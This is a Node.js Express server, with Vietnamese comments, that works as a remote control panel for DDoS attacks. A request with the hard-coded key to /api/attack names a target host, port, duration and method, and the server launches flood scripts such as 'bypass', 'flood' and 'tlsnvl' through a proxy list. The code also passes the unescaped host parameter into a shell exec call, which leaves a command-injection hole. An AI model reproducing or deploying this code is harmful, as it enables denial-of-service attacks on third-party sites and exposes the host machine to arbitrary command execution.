const express = require("express");
const app = express();
const port = 9998;
const { exec } = require("child_process");

const API_KEY = "zentra";
const MAX_TIME = 200;
const PORT_RANGE = [1, 65535];

let isAttackRunning = false; // Biến toàn cục để kiểm tra trạng thái lệnh

const attackMethods = {
  bypass: (host, port, time) => `node bypass ${host} ${time} 8 4 proxy.txt bypass`,
  flood: (host, port, time) =>
    `node flood ${host} ${time} 8 4 proxy.txt`,
  "tlsnvl": (host, port, time) => `node tlsnvl.js ${host} ${time} 8 4 proxy.txt bypass`,
  https: (host, port, time) => `node https ${host} ${time} 8 4 proxy.txt`,
};

app.use(express.json());

app.get("/api/attack", (req, res) => {
  const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;

  console.log(`[INFO] IP Request: ${clientIP} - Method: ${method}`);

  // Kiểm tra đầu vào
  if (!key || !host || !time || !method || !port) {
    return res.status(400).json({
      status: "error",
      message: "Missing parameters. Format: /api/attack?key=...&host=...&port=...&method=...&time=...",
    });
  }

  if (key !== API_KEY) {
    return res.status(403).json({ status: "error", message: "Invalid API key." });
  }

  const timeInt = parseInt(time);
  const portInt = parseInt(port);

  if (timeInt > MAX_TIME) {
    return res.status(400).json({ status: "error", message: `Time must be <= ${MAX_TIME} seconds.` });
  }

  if (portInt < PORT_RANGE[0] || portInt > PORT_RANGE[1]) {
    return res.status(400).json({ status: "error", message: "Invalid port." });
  }

  const attackFunc = attackMethods[method.toLowerCase()];
  if (!attackFunc) {
    return res.status(400).json({
      status: "error",
      message: "Unsupported method.",
      supported: Object.keys(attackMethods),
    });
  }

  if (isAttackRunning) {
    return res.status(429).json({
      status: "error",
      message: "Server is busy. Wait for the current attack to finish.",
    });
  }

  // Bắt đầu tấn công
  isAttackRunning = true;

  res.status(200).json({
    status: "success",
    message: "Attack started",
    host,
    port,
    time,
    method,
  });

  const command = attackFunc(host, portInt, timeInt);
  exec(command, (error, stdout, stderr) => {
    if (error || stderr) {
      console.error(`[ERROR] Attack failed from ${clientIP}: ${error?.message || stderr}`);
    } else {
      console.log(`[SUCCESS] Attack from ${clientIP} finished.`);
    }
    isAttackRunning = false; // Cho phép người khác chạy sau khi hoàn tất
  });
});

app.listen(port, () => {
  console.log(`[API SERVER] Running at http://localhost:${port}`);
});